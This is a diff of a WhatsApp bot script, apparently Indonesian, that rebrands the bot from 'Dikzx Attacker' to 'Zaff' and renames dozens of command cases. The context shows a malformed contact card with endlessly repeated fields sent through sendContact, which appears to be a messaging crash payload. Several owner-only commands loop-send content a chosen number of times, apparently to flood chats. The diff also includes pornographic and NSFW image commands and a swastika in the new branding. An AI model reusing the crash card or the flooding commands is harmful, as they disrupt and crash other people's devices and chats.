karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
 haikal.sendContact(m.chat, global.ownerr, fkontaak)
 }
 }
@@ -1667,7 +1667,7 @@ haikal.sendMessage(m.chat, { image: anu, caption: `${buttonkal}` }, { quoted: m}
 }
 break
 //=================================================//
-case 'dikzxbokep': case 'dikzxngentod': {
+case 'zaffbokep': case 'zaffngentod': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1680,7 +1680,7 @@ haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${co
 }
 break
 //=================================================//
-case 'dikzxsange': {
+case 'zaffsange': {
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) return m.reply(mess.group)
 if (!isBotAdmins) return m.reply(mess.botAdmin)
@@ -1712,7 +1712,7 @@ caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}
 bugcrot
 bugahay `,
 }
-haikal.sendMessage(m.chat, anuala, `© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`, m)
+haikal.sendMessage(m.chat, anuala, `© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`, m)
 }
 }
 break
@@ -1724,7 +1724,7 @@ if (!AntiNsfww) return m.reply(mess.nsfw)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 const bugcrot = {
 image: {url:waifudd.data.url},
-caption: `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ${buttonkal}`,
+caption: `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ${buttonkal}`,
 } 
 haikal.sendMessage(m.chat, bugcrot, { quoted: m }).catch(err => {
  return('Error!')
@@ -1739,7 +1739,7 @@ m.reply(mess.wait)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
  const bugahay = {
 image: {url:waifudd.data.url},
-caption: `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ${buttonkal}`,
+caption: `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ${buttonkal}`,
 } 
 haikal.sendMessage(m.chat, bugahay, { quoted: m }).catch(err => {
  return('Error!')
@@ -1815,7 +1815,7 @@ haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
 }
 break
 //=================================================//
-case 'dikzxhu': case 'dikzx1': {
+case 'zaffhu': case 'zaff1': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1828,7 +1828,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dikzxhi': case 'dikzx2': {
+case 'zaffhi': case 'zaff2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1841,7 +1841,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dikzxha': case 'dikzx3': {
+case 'zaffha': case 'zaff3': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1854,7 +1854,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dikzxhe': case 'dikzx4': {
+case 'zaffhe': case 'zaff4': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1867,7 +1867,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dikzxba': case 'dikzx5': {
+case 'zaffba': case 'zaff5': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1880,7 +1880,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dikzxbe': case 'dikzx6': {
+case 'zaffbe': case 'zaff6': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1893,7 +1893,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dikzxbu': case 'dikzx7': {
+case 'zaffbu': case 'zaff7': {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1906,7 +1906,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dikzxbi': case 'dikzx8': {
+case 'zaffbi': case 'zaff8': {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1919,7 +1919,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dikzxca': case 'dikzx9': {
+case 'zaffca': case 'zaff9': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1932,7 +1932,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dikzxci': case 'dikzx10': {
+case 'zaffci': case 'zaff10': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1945,7 +1945,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dikzxcu': case 'dikzx11': {
+case 'zaffcu': case 'zaff11': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1958,7 +1958,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dikzxco': case 'sleme12': {
+case 'zaffco': case 'sleme12': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -2057,7 +2057,7 @@ if (isBan) throw sticBanLu(from)
  haikal.sendMessage(m.chat, {audio: mu, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
  }
  break
-case 'dikzx': {
+case 'zaff': {
 if (isBan) throw sticBanLu(from)
  me = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
  haikal.sendMessage(m.chat, {audio: me, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
@@ -2617,7 +2617,7 @@ const result4 = `*DOWNLOAD MEDIAFIRE*
 *Link* : ${baby1[0].link}\n
 _whoa wait zimbot processing..._
 
-*© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢*`
+*© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢*`
 reply(`${result4}`)
 haikal.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted: m }).catch ((err) => m.reply('*Failed to download File*'))
 }
@@ -3387,7 +3387,7 @@ break
 //=================================================//
 case 'ramalanjodoh': case 'ramaljodoh': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢, 7, 7, 2005, Putri, 16, 11, 2004`
+if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢, 7, 7, 2005, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
@@ -3397,7 +3397,7 @@ break
 //=================================================//
 case 'ramalanjodohbali': case 'ramaljodohbali': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢, 7, 7, 2005, Putri, 16, 11, 2004`
+if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢, 7, 7, 2005, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
@@ -3407,7 +3407,7 @@ break
 //=================================================//
 case 'suamiistri': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢, 7, 7, 2005, Putri, 16, 11, 2004`
+if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢, 7, 7, 2005, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
@@ -3417,7 +3417,7 @@ break
 //=================================================//
 case 'ramalancinta': case 'ramalcinta': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢, 7, 7, 2005, Putri, 16, 11, 2004`
+if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢, 7, 7, 2005, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
@@ -3427,7 +3427,7 @@ break
 //=================================================//
 case 'artinama': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ Gans`
+if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ Gans`
 let anu = await primbon.arti_nama(text)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
@@ -3436,7 +3436,7 @@ break
 //=================================================//
 case 'kecocokannama': case 'cocoknama': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢, 7, 7, 2005`
+if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
@@ -3446,7 +3446,7 @@ break
 //=================================================//
 case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢|Putri`
+if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢|Putri`
 let [nama1, nama2] = text.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return m.reply(anu.message)
@@ -3526,7 +3526,7 @@ break
 //=================================================//
 case 'fengshui': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
+if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return m.reply(anu.message)
@@ -3606,7 +3606,7 @@ break
 //=================================================//
 case 'sifat': case 'karakter': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢, 7, 7, 2005`
+if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
@@ -3616,7 +3616,7 @@ break
 //=================================================//
 case 'keberuntungan': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢, 7, 7, 2005`
+if (!text) throw `Example : ${prefix + command} © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
@@ -3644,167 +3644,167 @@ haikal.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${
 }
 break
 /*
-case 'dikzxsound1':
-case 'dikzxsound2':
-case 'dikzxsound3':
-case 'dikzxsound4':
-case 'dikzxsound5':
-case 'dikzxsound6':
-case 'dikzxsound7':
-case 'dikzxsound8':
-case 'dikzxsound9':
-case 'dikzxsound10':
-case 'dikzxsound11':
-case 'dikzxsound12':
-case 'dikzxsound13':
-case 'dikzxsound14':
-case 'dikzxsound15':
-case 'dikzxsound16':
-case 'dikzxsound17':
-case 'dikzxsound18':
-case 'dikzxsound19':
-case 'dikzxsound20':
-case 'dikzxsound21':
-case 'dikzxsound22':
-case 'dikzxsound23':
-case 'dikzxsound24':
-case 'dikzxsound25':
-case 'dikzxsound26':
-case 'dikzxsound27':
-case 'dikzxsound28':
-case 'dikzxsound29':
-case 'dikzxsound30':
-case 'dikzxsound31':
-case 'dikzxsound32':
-case 'dikzxsound33':
-case 'dikzxsound34':
-case 'dikzxsound35':
-case 'dikzxsound36':
-case 'dikzxsound37':
-case 'dikzxsound38':
-case 'dikzxsound39':
-case 'dikzxsound40':
-case 'dikzxsound41':
-case 'dikzxsound42':
-case 'dikzxsound43':
-case 'dikzxsound44':
-case 'dikzxsound45':
-case 'dikzxsound46':
-case 'dikzxsound47':
-case 'dikzxsound48':
-case 'dikzxsound49':
-case 'dikzxsound50':
-case 'dikzxsound51':
-case 'dikzxsound52':
-case 'dikzxsound53':
-case 'dikzxsound54':
-case 'dikzxsound55':
-case 'dikzxsound56':
-case 'dikzxsound57':
-case 'dikzxsound58':
-case 'dikzxsound59':
-case 'dikzxsound60':
-case 'dikzxsound61':
-case 'dikzxsound62':
-case 'dikzxsound63':
-case 'dikzxsound64':
-case 'dikzxsound65':
-case 'dikzxsound66':
-case 'dikzxsound67':
-case 'dikzxsound68':
-case 'dikzxsound69':
-case 'dikzxsound70':
-case 'dikzxsound71':
-case 'dikzxsound72':
-case 'dikzxsound73':
-case 'dikzxsound74':
-case 'dikzxsound75':
-case 'dikzxsound76':
-case 'dikzxsound77':
-case 'dikzxsound78':
-case 'dikzxsound79':
-case 'dikzxsound80':
-case 'dikzxsound81':
-case 'dikzxsound82':
-case 'dikzxsound83':
-case 'dikzxsound84':
-case 'dikzxsound85':
-case 'dikzxsound86':
-case 'dikzxsound87':
-case 'dikzxsound88':
-case 'dikzxsound89':
-case 'dikzxsound90':
-case 'dikzxsound91':
-case 'dikzxsound92':
-case 'dikzxsound93':
-case 'dikzxsound94':
-case 'dikzxsound95':
-case 'dikzxsound96':
-case 'dikzxsound97':
-case 'dikzxsound98':
-case 'dikzxsound99':
-case 'dikzxsound100':
-case 'dikzxsound101':
-case 'dikzxsound102':
-case 'dikzxsound103':
-case 'dikzxsound104':
-case 'dikzxsound105':
-case 'dikzxsound106':
-case 'dikzxsound107':
-case 'dikzxsound108':
-case 'dikzxsound109':
-case 'dikzxsound110':
-case 'dikzxsound111':
-case 'dikzxsound112':
-case 'dikzxsound113':
-case 'dikzxsound114':
-case 'dikzxsound115':
-case 'dikzxsound116':
-case 'dikzxsound117':
-case 'dikzxsound118':
-case 'dikzxsound119':
-case 'dikzxsound120':
-case 'dikzxsound121':
-case 'dikzxsound122':
-case 'dikzxsound123':
-case 'dikzxsound124':
-case 'dikzxsound125':
-case 'dikzxsound126':
-case 'dikzxsound127':
-case 'dikzxsound128':
-case 'dikzxsound129':
-case 'dikzxsound130':
-case 'dikzxsound131':
-case 'dikzxsound132':
-case 'dikzxsound133':
-case 'dikzxsound134':
-case 'dikzxsound135':
-case 'dikzxsound136':
-case 'dikzxsound137':
-case 'dikzxsound138':
-case 'dikzxsound139':
-case 'dikzxsound140':
-case 'dikzxsound141':
-case 'dikzxsound142':
-case 'dikzxsound143':
-case 'dikzxsound144':
-case 'dikzxsound145':
-case 'dikzxsound146':
-case 'dikzxsound147':
-case 'dikzxsound148':
-case 'dikzxsound149':
-case 'dikzxsound150':
-case 'dikzxsound151':
-case 'dikzxsound152':
-case 'dikzxsound153':
-case 'dikzxsound154':
-case 'dikzxsound155':
-case 'dikzxsound156':
-case 'dikzxsound157':
-case 'dikzxsound158':
-case 'dikzxsound159':
-case 'dikzxsound160':
-case 'dikzxsound161':
+case 'zaffsound1':
+case 'zaffsound2':
+case 'zaffsound3':
+case 'zaffsound4':
+case 'zaffsound5':
+case 'zaffsound6':
+case 'zaffsound7':
+case 'zaffsound8':
+case 'zaffsound9':
+case 'zaffsound10':
+case 'zaffsound11':
+case 'zaffsound12':
+case 'zaffsound13':
+case 'zaffsound14':
+case 'zaffsound15':
+case 'zaffsound16':
+case 'zaffsound17':
+case 'zaffsound18':
+case 'zaffsound19':
+case 'zaffsound20':
+case 'zaffsound21':
+case 'zaffsound22':
+case 'zaffsound23':
+case 'zaffsound24':
+case 'zaffsound25':
+case 'zaffsound26':
+case 'zaffsound27':
+case 'zaffsound28':
+case 'zaffsound29':
+case 'zaffsound30':
+case 'zaffsound31':
+case 'zaffsound32':
+case 'zaffsound33':
+case 'zaffsound34':
+case 'zaffsound35':
+case 'zaffsound36':
+case 'zaffsound37':
+case 'zaffsound38':
+case 'zaffsound39':
+case 'zaffsound40':
+case 'zaffsound41':
+case 'zaffsound42':
+case 'zaffsound43':
+case 'zaffsound44':
+case 'zaffsound45':
+case 'zaffsound46':
+case 'zaffsound47':
+case 'zaffsound48':
+case 'zaffsound49':
+case 'zaffsound50':
+case 'zaffsound51':
+case 'zaffsound52':
+case 'zaffsound53':
+case 'zaffsound54':
+case 'zaffsound55':
+case 'zaffsound56':
+case 'zaffsound57':
+case 'zaffsound58':
+case 'zaffsound59':
+case 'zaffsound60':
+case 'zaffsound61':
+case 'zaffsound62':
+case 'zaffsound63':
+case 'zaffsound64':
+case 'zaffsound65':
+case 'zaffsound66':
+case 'zaffsound67':
+case 'zaffsound68':
+case 'zaffsound69':
+case 'zaffsound70':
+case 'zaffsound71':
+case 'zaffsound72':
+case 'zaffsound73':
+case 'zaffsound74':
+case 'zaffsound75':
+case 'zaffsound76':
+case 'zaffsound77':
+case 'zaffsound78':
+case 'zaffsound79':
+case 'zaffsound80':
+case 'zaffsound81':
+case 'zaffsound82':
+case 'zaffsound83':
+case 'zaffsound84':
+case 'zaffsound85':
+case 'zaffsound86':
+case 'zaffsound87':
+case 'zaffsound88':
+case 'zaffsound89':
+case 'zaffsound90':
+case 'zaffsound91':
+case 'zaffsound92':
+case 'zaffsound93':
+case 'zaffsound94':
+case 'zaffsound95':
+case 'zaffsound96':
+case 'zaffsound97':
+case 'zaffsound98':
+case 'zaffsound99':
+case 'zaffsound100':
+case 'zaffsound101':
+case 'zaffsound102':
+case 'zaffsound103':
+case 'zaffsound104':
+case 'zaffsound105':
+case 'zaffsound106':
